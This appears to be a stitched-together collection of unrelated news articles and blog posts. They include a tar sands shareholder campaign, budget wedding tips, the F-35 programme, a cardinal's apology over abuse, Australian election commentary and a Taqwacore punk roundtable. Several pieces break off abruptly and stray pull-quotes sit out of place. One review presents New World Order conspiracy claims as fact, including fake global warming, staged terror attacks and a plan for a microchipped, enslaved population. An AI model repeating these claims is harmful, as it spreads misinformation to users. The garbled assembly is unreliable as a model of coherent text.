The executives recommend examining assumptions about " paying dues " as it relates to women , asking management to evaluate employees that are not naturally inclined to self - promotion , working closely with management to ensure employees are advancing , creating more development programs for aspiring executives and working closely with business schools to help coach applicants on the ways of the work world .

Protest against tar sands industry outside Canadian Embassy in London Campaigners against the extraction of oil from tar sands are encouraging people to lobby their pension schemes if they hold shares in Shell or BP .
Both firms face resolutions at their shareholder AGMs , questioning their involvement in the business .
The website of Fairpensions lets people send an e-mail direct to their pension fund or ISA provider .
The initiative is being supported by a coalition of trade unions and environmental campaigners .
Catherine Howarth , chief executive of Fairpensions , said the e-mail campaign was an attempt to improve the accountability of both companies and their major investors .
" People do not always realise that their pension provider holds shares in major companies on their behalf , " she said .
" Anyone with pension savings has a right to lobby their fund manager on how to vote on these vitally important resolutions , " she added .
Problems
The extraction of oil from the world 's huge fields of tar sands , in countries such as Canada , is controversial .
It leaves a much smaller footprint in the surface
BP spokesman
The oil is naturally present as a particularly sticky form of bitumen , typically mixed with sand .
Campaigners say the most common extraction process , akin to open - cast mining , produces far more greenhouse gases than normal oil extraction , leaves large amounts of toxic waste and causes widespread damage to the environment .
The resolutions that some shareholders have submitted to the annual general meetings - BP's in April and Shell 's in May - call on the companies to justify their investment in the business and explain what they are doing to counteract the problems associated with it .
" One thing the resolution calls for happens already , " said a BP spokesman .
" It calls for senior BP management to engage with the investment community , and we do that anyway . "
Underground BP explained that so far , it had not produced a drop of oil from its tar sands project in Alberta in Canada .
It hopes to give the final go - ahead for the plan , known as project Sunrise , later this year .
The spokesman explained that the tar sands field it was interested in was underground , not on the surface .
The oil will be extracted via wells and underground pipes , in a process developed over the past decade called steam - assisted gravity drainage .
" It leaves a much smaller footprint in the surface , " he said .
Email campaign Fairpensions ' web - tool lets individuals type in the name of their pension scheme or ISA provider .
This generates an e-mail that can be sent to the relevant pension fund or investment manager , calling on them to support the AGM resolutions .
The plan is supported by groups such as Greenpeace , WWF , the Co-op and several trade unions .
Dave Prentis , general secretary of the large public sector union Unison , said : " We 're getting the word out to our 1.3 million members in Britain 's public services , encouraging them to express support to their pension funds and savings institutions . "
" Our members ' pension funds have an estimated investment value of £ 250bn , so at Unison , we understand the need for a low - carbon economy .
" These resolutions demand the clear answers from oil companies which our members need and deserve , " he added .

In Jason Bermas ’ latest documentary , Invisible Empire : A New World Order Defined , we get a finely honed lesson in what the New World is and who has spoken its name .
Jason collates a mass of video and audio quotes of insiders mentioning and promoting the globalist plan to convert the world into an authoritarian slave labor gulag .
If you think the term “ New World Order ” is an exaggeration flouted by tinfoil hat conspiracists , Bermas ’ film will change your mind .
In addition to Bush Senior ’s often quoted reference to the New World Order , Invisible Empire reveals in engaging staccato fashion others who have used the term : Henry Kissinger , Gary Hart , Bill Clinton , Paul Wolfowitz , Michael Mullen , David Cameron , Gordon Brown and a host of government insiders , academics , and corporate media personalities .
30 minutes into this important film , the deniers will be stripped of their arguments and left speechless by Bermas ’ presentation of the facts .
A d v e r t i s e m e n t
{openx:49}
Invisible Empire moves on to break down who the power elite is and the organizations they front — beginning with Samuel Zane Batten ’s 1919 manifesto New World Order and the British Round Table groups formed by South African diamond baron Cecil Rhodes and Lord Milner , Bermas ’ over two hour film then moves on to the Council On Foreign Relations , the Trilateral Commission , and the Bilderberg Group .
Jason hits us with a spellbinding array of details on the criminal behavior of the elite and the governments they control — drug trafficking , money laundering , fake global warming , staged terror attacks , assassination , media propaganda and most importantly considering Obama ’s totalitarian care a staggering national debt owed to the bankers .
Details are abundant .
Bermas covers the bizarre occult obsessions of the elite at Bohemian Grove , the determined move toward a microchipped enslaved population , and the propensity of the elite toward perversion and prostitution rings .
Invisible Empire is a primer on the New World Order and many of its facets are assiduously ignored by the corporate media and mainstream academics .
The film is an excellent educational tool for convincing the deniers who buy into the corporate media mirage that all is well and the government has our best interests in mind .

DETROIT -- Christopher Ilitch referred to Tom Wilson , his one - time business competitor , as innovative , a visionary , a man who gets things done .
Wilson will help grow and expand the Ilitch sports and entertainment empire .
And a big part of that growth is to potentially get the Detroit Red Wings a state - of - the - art facility to replace the outdated Joe Louis Arena .
“ Tom ’s going to be leading our thinking and our initiatives in that regard , ” Ilitch , president and CEO of Ilitch Holdings , said Tuesday at a news conference welcoming Wilson into the organization .
“ He clearly has the resume and the experience and he ’s exceptionally well - suited for it . ”
Wilson played a key role in getting The Palace of Auburn Hills built two decades ago for the Detroit Pistons .
He resigned last week after 32 years with Palace Sports & Entertainment .
He now is the president and CEO of a yet - to - be- named enterprise of Ilitch Holdings .
Wilson will oversee the business and marketing operations of the various Ilitch entities , which includes the Red Wings and Detroit Tigers .
“ We have a chance to shape the business for two teams , which is going to be fun , ” Wilson said .
“ We have an opportunity to dig into the entertainment side of the business with six different venues .
We ’ll get involved a little bit in the casino side , all the Ilitch empires . ”
But his first major task is to settle the Red Wings ’ building issues .
“ It ’s a very important decision , not only for our hockey club , but for this community , as to whether we stay at the Joe and renovate the Joe or build a new arena , ” Ilitch said .
Ilitch , whose organization has purchased land around the Fox Theatre , prompting speculation it will be the site for a new arena , said there are “ a lot of possibilities in the city of Detroit ” for an arena location .
He put no time frame on when he would like a building in place but said once they decide which course to take they will move swiftly .
The Red Wings are in the final year of their lease at Joe Louis Arena and Ilitch said there is no looming deadline in securing a new short - term lease .
“ We ’ve been working with the City of Detroit for some time for a new lease at the Joe .
We continue to make good progress , ” Ilitch said .
“ We got a great relationship with the city and we ’re of the same mindset to work something out . ”
But he also did n’t rule out the possibility of the Red Wings playing at The Palace while a new arena is built .
“ We ’re not really here to announce or get into that type of thing at this point , ” Ilitch said .
Ilitch said it ’s too soon to say whether his organization will seek public funding to build an arena .
He seemed lukewarm to the possibility of having the Red Wings and Pistons share a new downtown arena .
“ Naturally , having two sports teams in one facility makes a whole lot more sense , but the fact of the matter is , they ’re separately owned organizations today , they ’re of different locales , they have their existing buildings , so there would be a lot of ground to cover for that ever to become a reality , ” Ilitch said .
“ And quite frankly , that ’s not our focus . ”
Added Wilson : “ In an optimal situation , you would have teams together .
It does make sense , but it ’s a complicated process . ”
Ilitch did not rule out buying the Pistons but indicated they are more focused on growing their existing businesses .
“ I would say we ’re focused on our existing businesses and we ’ll go from there , ” Ilitch said .
“ It ’s tough to say at this point ( whether there is interest in the Pistons ) . ”
Wilson said Ilitch already has given him a list of 40 or 50 things to look into , from expansions and acquisitions to growth and diversification .
Wilson said it will not be uncomfortable competing against his former employer .
“ While we used to be sort of bitter rivals , now we ’re just sort of rivals and competitors , ” Wilson said .
“ There is no one rooting against each other .
We all sort of realize that if the Tigers win a pennant , that ’s great for everybody .
If the Pistons win a championship , that ’s great for everybody .
“ There ’s a natural competition and I know that it will be a little awkward .
They ’re going to like to beat me as much as I ’d like to beat them .
So that makes it fun . ”
Wilson apparently will have little or no involvement in the hockey and baseball operations of Ilitches ’ teams , whose power structure remains the same .
Red Wings general manager Ken Holland and Tigers president and CEO Dave Dombrowski will continue to report to owner Mike Ilitch .
“ Nothing changes in that regard , ” Mike Ilitch said in a statement .
“ However , given Tom ’s sales and marketing expertise , his connections in the industry and community , and his proven ability to get things done , I believe Ken , Dave and Tom will find natural opportunities to partner together on the promotional and customer - service sides of hockey and baseball . ”
Ten adverts that shocked the world Benetton 's Aids sufferer campaign
This Benetton advert features a photo of Aids sufferer and activist David Kirby and his family by Therese Frare ( 1990 ) .
The original picture , which won the World Press Photo Award , was published in black and white , but Benetton 's advertisers decided they wanted to use a colour version to make it seem more shockingly like a real ad .
The ad was designed to raise awareness of Aids and Kirby 's family and Frare approved of the photos use .
But it provoked a storm of criticism from other Aids activists who claimed the campaign was in some way a vindication of homosexuality

The first way save money on your wedding is the most important : you have to want to save money .
I ’ve noticed in the past few years that some things are worth paying for , and some things are not .
But just because you do n’t pay for something does n’t mean you ca n’t get great results ( and sometimes better results ) by using your creativity .
Here are a few simple tips if you are planning a wedding on a tight budget .
They all involve creativity , so open your mind and get creative ( or call you sister or friend or aunt in the room to help you out ) .
1 . Do it yourself .
When Bob and I got married , we made our own invitations and mailed them ourselves .
We printed out everyone ’s names and addresses on the envelopes and just made it happen .
Our wedding was a less formal ( which we ’ll talk about later ) so making them in Word worked fine for us .
But what are some things like this that you can do yourself ?
Flower arrangements ?
A friend of mine had all her bridesmaids over and they all made their own bouquet .
My sister ordered candies and boxed them herself and gave them as favors .
2 . Use the people you know to help you .
One thing I noticed when Bob and I got married is that there were so many people who wanted to help us .
Some knew we were planning it with a tight budget and some did n’t , but it was almost overwhelming how many people wanted to help us .
And it made me want to help anyone I can in the same way .
I thought I should n’t take anyone up on their offer , but now that I ’m on the other side of it , I see it differently .
Let people help you !
For instance , if you have a friend who is a graphic designer ( or even knows how to use design programs ) , see if they ’ll help you with your invitations .
Then , go print them on paper you pick out yourself and buy for a much lower cost .
You can do this with anything : your band / DJ , photographer , centerpiece design , food , etc .
And what ’s wonderful about this is you get to let others in on your life , and that is so valuable !
One of the most beautiful weddings I ’ve seen was one where everyone pitched in .
Below are some pictures to show how beautiful they can be .
Wedding Example # 1 :
The ceremony was held indoors at a park clubhouse .
As you can see , it was beautiful .
My friends grandmother made her homemade canoli ’s for dessert !
They had lot a bird theme and these were their favors – hand made .
The centerpieces were made from items found at thrift shops , the lace table cloths were found at vintage shops .
Each table was different , unique , and so beautiful !
There were also branches of a birch tree on each table , coming out of vintage vases .
I ’ve never seen centerpieces so beautiful !
Since they got married at a park , there were some amazing photo opportunities !
Can you believe how beautiful this is !?
Wedding Example # 2 :
This backyard wedding has an amazing view , as you can see .
They had friends and family participate in their ceremony by holding this beautiful lace above them .
Easily removed to make more space for the guests after the ceremony was over , and it added such a personal touch !
She and her bridesmaids did their own hair ( Here ’s a simple tutorial for a low messy bun ) !
And these beautiful hair pieces were made by a friend .
Do n’t you love the way the lit up the night ?
And check out these chandeliers they made :
They are mason jars hung from trees with candles in them .
AMAZING !
3 . Think about your location .
I used to work for my church , so we got a great deal when we got married there .
But , not everyone has that luxury .
A friend of my got married at a beautiful clubhouse in a park .
Another friend got married at the entrance of her aunts house .
There was a fountain and it was absolutely beautiful .
And that was free !
I also knew someone who wanted to get married at a very expensive location .
Upon further investigation , he found out that if he got married on a Sunday instead of a Saturday , the price dropped dramatically .
4. Redefine your idea of a wedding altogether .
Bob and I had a wonderful , tiny wedding .
We invited our immediate family only , plus grandparents , and each had 1 friend .
My brother , a wonderful musician , played piano as I walked down the aisle , my brother - in - law video taped , and Bob ’s friend took the photos .
It was an amazing day for us to spend with the closest people to us and there was no stress because it was so small .
We would n’t have had it any other way .
We went to lunch after and had a small reception a month later ( which we made the invitations for ) and it was absolutely perfect for us .
I do n’t recommend this for everyone , but I do recommend everyone think about how they can make their special day reflect them as much as possible .
If that means having a big wedding , great !
Hopefully some of my tips will help .
🙂
But I hope to at least inspire some of you to think of wonderful , original ideas to save some money and make your wedding a day you ’ll never forget .
There are so many creative tips for planning a wedding on a budget , and I know everyone has learned at least a few , so please share them in the comments section below .

The Pentagon wants the F - 35 to replace most of its ageing fighter jets .
US Defence Secretary Robert Gates has sacked the marine general overseeing a $ 40 bn ( £ 25 bn ) project to build the next generation strike fighter jet .
F - 35 programme chief Maj Gen David Heinz will be replaced by a yet to be named higher ranking general .
Mr Gates said the F - 35 programme had been plagued by problems and failed to hit performance targets .
He also said Lockheed Martin , the US firm making the jet , would not receive $ 614 m in performance - related payouts .
The Pentagon wants the F - 35 to replace most of its ageing fighter jets .
" The progress and performance of the F - 35 over the past two years has not been what it should , " Mr Gates told a news conference on the Pentagon 's proposed budget .
He added that " a number of key goals and benchmarks were not met " .
Inserting a human protein important in cancer development was able to revive dying plants , showing an evolutionary link between plants and humans and possibly making it easier to study the protein 's function in cancer development , a Purdue University study has shown .
The aminopeptidase M1 protein , or APM1 , is critical for root development in plants .
Arabidopsis plants lacking the protein will die , but can be rescued if the protein is restored .
During experiments , Wendy Peer , a research assistant professor of horticulture , found that inserting a similar protein found in humans , called insulin responsive aminopeptidase , or IRAP , also rescued the plants .
" APM1 and IRAP are in the same group , " said Peer , whose results were published in the early online version of the journal Plant Physiology .
" M1 aminopeptidase activity is such a fundamental process that it 's been conserved evolutionarily .
This protein has changed very little over time . "
Peer said the finding could advance the understanding of this class of proteins because it might make it possible to conduct studies with plants instead of animals , offering researchers more control and options .
Humans with altered function of the equivalent proteins often have leukemia or other cancers .
" There are more tools available in Arabidopsis to study this class of proteins than are available in animals , " Peer said .
" This research could be translational and helpful in the animal field or with human health .
If humans have changes in these peptidases , they 're very sick .
Understanding how these proteins work in plants will help us understand how they work in humans . "
APM1's function is n't entirely understood in plants .
M1 aminopeptidases are thought to remove amino acids from proteins , thereby either activating or deactivating those proteins .
M1 aminopeptidases also break down accumulations of proteins related to Alzheimer 's disease .
" APM1 can alter the function of other proteins with its activity , " Peer said .
Peer wants to understand which proteins APM1 targets and how it changes those proteins , thereby affecting changes in a plant 's development .
She is working to discover which amino acids in APM1 are necessary for it to function .
Peer and Angus Murphy , a Purdue professor of horticulture , have been working on this problem for several years .
They identified Arabidopsis mutants that were missing APM1 and inserted modified APM1 proteins missing particular amino acids into the mutants to determine whether the modified APM1 protein could rescue the seedlings .
The next step in Peer 's research is to determine APM1's target protein to better understand why APM1 is important for root growth .
The National Science Foundation funded the research .
Microsoft has made its next move against competitor Google by publicly announcing that it will remove the Internet Protocol ( IP ) addresses of logged searches from its servers after 6 months of storage .
Back in September of 2008 , search engine goliath Google announced it would begin anonymizing IP addresses logged in its servers after nine months , a reduction by half from its previous 18 .
Cookies would also be removed after this time .
Google Critics : Time Frame Still Not Enough
Privacy advocates have criticized Google for not doing enough , since the company only bothers to remove the last of four sets of numbers in an IP address , meaning someone ingenious enough might figure out how to reconstruct the information .
In an effort to one - up Google , Microsoft has announced its data retention policy will now call for storage of IP addresses for just six months .
The company 's chief privacy strategist , Peter Cullen , noted that the new policy reflects a number of Microsoft 's desires , the most important being an interest in keeping competitive and responding to dialogue from privacy advocates and other consumers .
Keeping Bing Growth Steady
In essence , the idea is to keep Bing 's growth steady .
At the moment , Microsoft 's search engine , unveiled last May , owns about 3.27 per cent of global search queries .
Google 's share is , by comparison , enormous , in December sitting at 85.34 per cent .
Still , in a market where growth is slow and each percentage a world of improvement , Bing 's numbers after less than a year are nothing to curtly dismiss .
On the surface at least , the announcement does make Google look bad .
That company has previously appeared reluctant to anonymize its data any faster than nine months , blaming worries over a " potential loss of security , quality , and innovation that may result from having less data . "

MS Promises Best of Both Worlds
On the issue of security and quality of service , Microsoft promises users of Bing can now have the best of both worlds .
Cullen noted that his company 's policy change " enables us to improve the quality of our results , protect against fraud and maintain a secure and viable business . "
In other words , Microsoft Bing users can have their cake and eat it , too .
Microsoft 's new search policy will take shape over the next 12 to 18 months .

For me , seeing this picture was just like finding out there ’s no Santa Claus .
Identifying mothers is vital DNA differences which appear to affect the risk of giving birth early have been found by US scientists .
The US National Institutes of Health study found the variants in both babies and mothers , a US conference was told .
It is thought they may play a role in controlling immune responses which could theoretically trigger labour if they become too powerful .
Premature birth - which accounts for 7 % of UK births - is one of the biggest threats to a baby 's future health .
The development of a reliable test for identifying these mothers is vital in ensuring our most vulnerable babies have the best possible outcomes
Andy Cole , Bliss
The causes of premature birth are poorly understood , although infections and other medical complications are blamed in some cases .
The study looked at 700 DNA variants in 190 genes in women who delivered early , and those who carried their baby to term .
The cord blood of the babies was also tested for these variations .
They narrowed the search down to a handful of gene variations found more often in the women who gave birth prematurely , and their babies .
In particular , babies who carried a DNA variant in the gene for the " Interleukin 6 receptor " were more likely to be born early .
This was a good candidate gene because Interleukin 6 is produced by cells in response to infection and is involved in inflammation .
High levels of Interleukin 6 in the amniotic fluid and foetal blood have been linked to the onset of premature labour .
Baby threat Dr Roberto Romero , who led the study , said : " Our hypothesis is that the mother and / or the foetus signal the onset of preterm labour when the environment inside the uterus is unfavourable and threatens the survival of the maternal - foetal pair .
" When there is an infection in the uterus , the onset of premature labour appears to have survival value - it would allow the mother to rid herself of infected tissue and preserve her ability to have future pregnancies . "
The chief executive of charity Bliss , Andy Cole , welcomed the study results .
" In England alone , 54,000 babies are born prematurely each year , a third of these for no known reason , " he said .
" The development of a reliable test for identifying these mothers is vital in ensuring our most vulnerable babies have the best possible outcomes . "

The head of Ireland 's Catholics has apologised for his role in mishandling the case of a serial child abuser .
As a priest in 1975 Cardinal Sean Brady was at meetings where children signed vows of silence over complaints against paedophile priest Fr Brendan Smyth .
He said he wanted to apologise to " all those who feel I have let them down " .
Meanwhile , Pope Benedict XVI has announced that on Friday he will sign his long awaited pastoral letter dealing with paedophilia in Ireland .
He said in recent months the church in Ireland had been " rocked by the crisis of abuse of minors " and hoped his letter would " help repentance , healing and renewal " .
Secrecy On Tuesday , the Catholic Church in Ireland released more details about why Cardinal Brady asked two victims , aged 10 and 14 , to sign secrecy agreements .
The church said the boys were asked to sign oaths " to avoid potential collusion " in evidence - gathering for an internal church inquiry .
Looking back I am ashamed that I have not always upheld the values that I profess and believe in

It added this would ensure that the complaints could " withstand challenge . "
The church statement did not explain why either Cardinal Brady or his superiors at the time did not share their information with the police .
Fr Smyth went on to abuse more children in the following years .
Delivering his St Patrick 's Day mass on Wednesday , Cardinal Brady said : " This week a painful episode from my own past has come before me .
" I have listened to reaction from people to my role in events 35 years ago .
" I want to say to anyone who has been hurt by any failure on my part that I apologise to you with all my heart .
" I also apologise to all those who feel I have let them down .
" Looking back I am ashamed that I have not always upheld the values that I profess and believe in . "

Cardinal Brady added that the church " must humbly continue to deal with the enormity of the hurt caused by abuse of children by some clergy and the hopelessly inadequate response to that abuse in the past " .
' Deeply saddened '
Meanwhile , the Norbertine Community - which Smyth was a member of throughout his time as a priest - has said it is " deeply saddened at the controversy surrounding Cardinal Sean Brady " .
" We again acknowledge our failure to remove Fr Smyth permanently from the exercise of ministry , " it said .
" We apologise again to each and every person who was abused at any time by Fr Smyth , to their families and to the many others who suffered through these events .
" We apologise also for our failures to Cardinal Brady , to Bishop Leo O'Reilly and to the congregation and friends who have continued to support us here at the abbey . "
Smyth was eventually convicted of dozens of offences against children .
Fr Brendan Smyth was convicted of dozens of offences
But despite allegations being previously investigated by church officials , including Cardinal Brady it was almost 20 years before he was brought to justice .
Northern Ireland 's deputy first minister , Martin McGuinness has said Cardinal Brady " should consider his position " .
He questioned how many other children were asked to stay silent .
However , NI Secretary of State Shaun Woodward said people should not " rush to judgement " on the issue .
Critics of the cardinal have accused him of colluding with clerical child sexual abuse and pressuring victims to remain silent .
The Rape Crisis Network Ireland ( RCNI ) said Cardinal Brady 's position had become untenable .
Hundreds of allegations , many going back decades , of systematic child abuse by Catholic clergy have come to light this year across Europe .
The scandal has surfaced in Germany - Pope Benedict 's homeland - Switzerland , Austria and the Netherlands .
Chancellor Angela Merkel said on Wednesday the only way to come to terms with it was to find out everything that has happened .
Describing the sexual abuse of children as a " despicable crime " , Mrs Merkel said abuse was a challenge " for the whole of German society " , and that it " made no sense " to focus solely on the Catholic Church .
She also said there should be a discussion about compensating victims and about lengthening the statute of limitations so that offences - many of which were committed decades ago - could be prosecuted .
Earlier , scandals have rocked the Catholic Church in the United States , Canada , Australia and Mexico .

Posted by John , March 21st , 2010 - under Labor Party , South Australia , Tasmania , The Liberals .
Tags : ALP , Australian Labor Party , Australian politics
There was enough in the voting in Tasmania and South Australia for all the conservative parties to claim a victory of sorts .
The Greens in Tasmania polled 21 percent of the vote .
They may hold the balance of power , assuming Labor and the Liberals do n’t shut them out with some shady deal .
The Greens ’ 21 percent , as their leader Nick McKim said , is the largest vote for the Greens in any State or Territory in Australia .
It is , he said , a vote for the new believers .
Well , maybe , but believers in what ?
A mixed economy where production for profit is the touchstone which determines what can and ca n’t be done ?
A vote for the Greens is not a vote for the Left .
Much of the support for the Greens comes from ( former ) Liberal voters .
As the Greens move closer to power they move to the right .
This will create tensions in their cross class alliance between the new believers and the Green left over the way forward .
Like the Democrats there is a real possibility they will wallow in mainstream mediocrity .
McKim stressed to business that the Greens were a safe pair of hands .
While I suspect Gunns wo n’t think so , the rest of business in Tasmania can breathe easy .
Labor in Tasmania has lost Government in their own right , but could govern with the support of the Greens in a deal similar to that in the ACT .
Here in Canberra we Territorians have a minority Labor Government which rules with the support of the Greens .
Nothing much has changed politically since October 2008 – still the same old conservative offerings from all sides .
Certainly the ACT Greens have imposed absolutely no radical program on Canberra ’s local ALP Government and it looks as if they will let Labor get away with large public service wage and jobs cuts .
Even worse , in Tasmania there is a chance the Liberals will do some sort of Faustian deal with one of the other parties and govern with the support of either Labor or the Greens .
The Greens have not ruled out a governing coalition with the Liberals .
In South Australia , despite the fruitcake faction of the bourgeoisie centred around The Australian having wet dreams about the Liberals winning , it looks as if Labor will govern with a majority of one or three .
Labor across Australia will claim this as evidence the ALP is not on the nose , or as South Australian Labor leader Mike Rann put it , the sweetest victory of all .
Yet the swing against Labor was over seven percent , and the ALP did not win the majority of votes on a two party preferred basis .
The Liberals did .
So Labor has scraped back into power in South Australia with the support of less than half the population .
This appears a victory to them because for the ALP and other bourgeois politicians the key is the reins of power in a capitalist parliament , not what the majority want .
In Tasmania the evidence against Labor – a twelve percent swing – is a little more inconvenient for the Rudd Government .
So what we have from Federal Labor and their apologists is spin about state issues deciding the results and that these two State Governments were old .
True , but not relevant .
The important issue is how many rejected Labor at the state level because of what it stands for – nothing but making life easy for the profiteers .
If so then the ALP federally will also have a problem because that is its philosophy too .
Indeed Rudd has modelled his Government on Rann ’s ‘ do nothing to upset the bosses ’ approach .
The levels of unemployment in both States are low by historical standards .
Yet there were big swings against both State Labor Governments .
The Rudd Labor Government may be starting to have a few nightmares that substantial swings like those in South Australia and Tasmania could happen against a Government who ‘ saved ’ the country from the Global Financial Crisis yet has done little for health , education or wages .
A 7 percent swing would destroy Rudd Labor .
The Liberals will sprout rubbish about the level of the swings and themselves spin about spin .
They will say the tide has turned .
Yet this is not a seismic change .
This is the battle between various factions of conservatism .
There is no sizeable political left in Australia capable of acting as a magnet for change .
There wo n’t be till the more organised and militant section of the working class revives and begins the process of setting up a radical alternative to Labor , one that challenges the very rule of capital .
Until that time the conservative yo- yoing between Labor and the Liberals will continue , and the lack of a left wing alternative allows the Greens to take that mantle for the moment .
The task before the Left is immense .
But our steady work will and must continue to lay the foundations in the future for a mass revolutionary party of the working class .
Readers might also like to look at ‘ We need a left alternative to Labor and the Greens ’ by Andrew Cheeseman in Socialist Alternative .
How many times have you asked yourself , " What if Hot Chip were a sexy boy band instead of kinda nerdy guys with glasses ? "
And , " What if their shows involved cross- dimensional attacks by fire - breathing sorcerers ? "
Well , you 're in luck , because the video for One Life Stand 's latest single " I Feel Better " , directed by Peter Serafinowicz , re-imagines the British dance pop troupe as a well - manicured and highly choreographed group of dudes ( apparently a dig at " X Factor " stars JLS -- thanks to reader Chris Wheatley for the tip ) Â who get an unexpected visitor or two during a performance before an audience of swooning young ladies .
Oh , and the nerdy guys with glasses make an appearance , too .
Bonkers .
Imagine standing in a copy shop , running off copies of a book you wrote .
You have to distribute it yourself , and you cannot keep up with demand .
Sometimes you get paid for the labor of copying and mailing .
That was Michael Muhammad Knight before his novel The Taqwacores found a publisher .
In 2003 , Knight was pushing out an underground novel that spoke to a generation of Muslim - American youth who had no cultural home .
There were pot-smoking , praying , Qur’an - reading Muslims , who would edit out sections of the Qur’an because they were “ wrong ” and no one could explain the text to them .
Playing with the Arabic word “ taqwa ” ( God-consciousness ) and the punk suffix “ core , ” Knight gave voice a segment of the Muslim - American community .
He also earned the ire of large parts of the community who were in denial that these people existed , who felt their power threatened , or who could not deal with the confusion their decisions caused .
Following is a roundtable discussion on the Taqwacore scene among Basim Usmani and Shahjehan Khan ( both members of the band the Kominas ) , Kaitlin Foley ( radio host and erstwhile Islam blogger ) , and myself .
— Hussein Rashid
______________________________
Q : When we consider that the contemporary Taqwacore scene was at least partly inspired by fiction , the fact that it exists in real life today becomes even more remarkable .
Kaitlin Foley has noted that social networking sites such as MySpace have played a significant role in galvanizing both virtual and bricks - and - mortar support for the Taqwacore bands , as they do for most bands today .
How do you all think the fictional and virtual origins of Taqwacore have affected the development of the Taqwacore scene so far , and how might they influence its future development ?
Basim Usmani :
This is funny , originally I had conceived of an all - Desi punk band called the Kominas before I began jamming with Shahj and before I even knew who Mike Knight was .
My impetus was the need to appropriate the cultures around me into something that could be my own .
So I would n’t feel weird or self - conscious listening to , or reading , or exposing myself to non-Desi elements .
I hated being graded for my Desi or Muslimness .
The music was born out of frustration , because of dead - end jobs , no prospects , and a huge shadow cast over me from my parents that busted their balls to provide a life for me ( which I still suck at ) .
MMK ’s work helped reconcile religion into the music , and really elaborated some of the beauty and iconoclasm inherent in Islam , which I was n’t really comfortable writing about .
I wanted a Punjabi Dropkick Murphys , Mike wanted a Qallandari Rancid .
Thinking about it , I like the latter better as well .
Everything begins as fiction in your head , mashing up concepts and understanding how ideas can fit is important .
I think the use of the Internet , quick access to media played a part in that .
Not MySpace .
Shahjehan Khan : I would say that social networking definitely gives us the ability to share our ideas quickly and easily .
Things may have been different if we were all ten years older , i.e. that would have forced us to look more locally among our communities / cities for musical support .
It also would have proved much more difficult to garner the kind of media attention that has become synonymous with Taqwacore ( be that positive or negative , I think both are true ) .
People may have been less apt to judge us based on our “ principles ” and actually focus on whether we created good music / were a good live band …
Conversely , the online world has allowed many people across the country and the globe to check us all out , and we have also made friends on MySpace , Facebook etc … that we may not have done so quickly .
Kaitlin Foley :
If and when there is a next step , it might be to connect the dots between the fictional and virtual origins of Taqwacore .
I ca n’t say Mike Knight ’s The Taqwacores was a genesis for me about Islam but it was an affirmation that self - publishing was a chance to throw out the rule book and create my own .
I could play around with social media to find people and ask why a fictional punk scene fascinates kids then shared my own stories with Madison street punks .
Some believed me , some did n’t care for hardcore .
As far as conversations about TQ in the future , I hope they will be less about identity crises and big picture modern dilemmas and more on the actual music .
Maybe the new sound should be deconstructed before social media tackles Islam , Taqwacore , and punk rock all at the same time .
Hussein Rashid :
Thanks BU , for the clarification .
I seem to recall meeting you and having this conversation before hearing about Mike Knight ’s book , but it ’s good to have that confirmation .
I do think the aesthetic element of your work is often overlooked .
One of my favorite tracks is “ I Want a Handjob , ” precisely because I think it has some of the qalandari element to it .
It has reverence for the family of the Prophet , and includes elements of contemporary cultural references with a good dose of sexual language .
Like a good South Asian or Persian lyric , it does not have to be devotional , but can incorporate those elements .
Even prior to the emergence of Taqwacore I was hesitant to label things “ Islamic . ”
It implies a level of religiosity that may not be present and obscures other intentions and meanings in the music .
I much prefer Marshall Hodgson ’s construction of “ Islamicate , ” for things that may be influenced by Islam , but are not necessarily religious .
I am curious about KF ’s point about identity crisis .
I never heard your music in that way .
To me , it is a declaration of the multiple identifications that make your identity .
It is the opposite of a crisis ; a resolution perhaps .
SK you talk about being ten years older , but it is fast approaching that time since the music started .
Do you think that time has made a difference ?
BU : I think that ’s a great observation , it is n’t identity crisis .
Time has definitely made a difference in terms of being in a band and touring and actually meeting people that are interested in the music we play .
KF : Sure , HR , I ’ll expand .
What I meant by identity crisis was that Taqwacores resolved what I think is a normal teenage phase when they found people like themselves and some shared world in punk .
Maybe BU would say his story would be a goth goes Taqwacore one instead but I think it ’s the same either way around — that is , in the end it ’s okay the stories are different and any message might evolve with new bands and music .
Maybe part of this is virtual and if I had to guess , blogging will have a bigger role in evolving the message .
Anyway , I was never on MySpace and I ’m not sure what this question asks .
The “ ask a blogger about social media ” is kinda a cliche .
I answer questions with social media , not about it .
There are other questions to ask about social media and networks than “ what ’s the scene going to look like ? ” when it comes to Taqwacore .
I ca n’t tell the future any better than Basim or Shahj can really judge how many people are actually fans of the book and their music .
Q : The virtual aspect of Taqwacore allows for greater international access to the music and discussion of TQ bands .
Do you believe that TQ is having an impact outside of the United States ?
If so , what ?
Why do you think it is having an appeal ?
If not , why ?
Is it the music ( the genre being very particular to the Anglophone world ) ?
the underlying thought of treating “ Muhammad as punk rocker ? ”
BU : What an ignorant question .
Anglophone world ?
Punk is ten times bigger in Kuala Lampur than it ever will be in the UK , France , or Germany .
Or America .
No , the reason for forming the Dead Bhuttos , and the rush to put a single online was to show , at least cosmetically , that Pakistan was as capable of putting out punk rock as Turkey , Malaysia , Japan , and Lebanon .
The USA is good to sell obscure Malaysian and Japanese records in , but it ’s not a good place to play this kind of music .
We ’d do much better in South Eastern Asia , which yes , we get a lot of traffic from online .
Tons of people from Singapore , Malaysia , and Indonesia add us .
We ’ve been covered in the major Malaysian music magazine .
I think it makes more sense for us to play in Malaysia then it does to play in Europe .
SK : Many things remain to be seen , but I think it would be a mistake to deny that Mike ’s book is having some kind of impact in the world .
We get messages frequently from bands / kids / music lovers / thinkers worldwide asking us when we are coming to their neck of the woods .
If I ’m not mistaken , outside of the US , our Facebook pages ’ popularity has Pakistan next in line .
Omar ’s documentary is currently screening in the UK , so I do n’t think anyone is really sure ( and I ’m not exactly certain how one would quantify this ) who is reading , who is listening etc …
HR : Ouch .
You are right BU , my question and it was poorly worded .
Clearly I know the the popularity of punk , amongst other genres , outside the Anglophone world .
I think Mike ’s book clearly speaks to a lot of people , but as fiction there is a comfortable level of distance .
You are actually making the music , and that ’s really the tension I want to explore .
It ’s one thing to utilize the genre , it ’s another to inject it with themes related to Islam .
I will be honest and say that I am surprised at how well your lyrical content is taken in Muslim majority countries .
With respect to Pakistan , CNN did a piece on Pakistani metal .
It seemed to be a highly artificial scene , almost staged for the cameras .
The concert footage in Pakistan seemed more organic .
What is your sense of the music scene in Pakistan ?
How does it compare to South East Asia , for example ?
BU : There is a much bigger music industry in Malaysia then Pakistan in a traditional sense .
Pakistan probably has a lot of money and publicity in its artists , and its more likely there will be press following Pakistani artists around — but thousands and thousands of people attend concerts in Kuala Lampur , and there is already a Malaysian scene for “ Western ” music , you ’ll find Malay skinheads , punks , metalheads , and rappers .
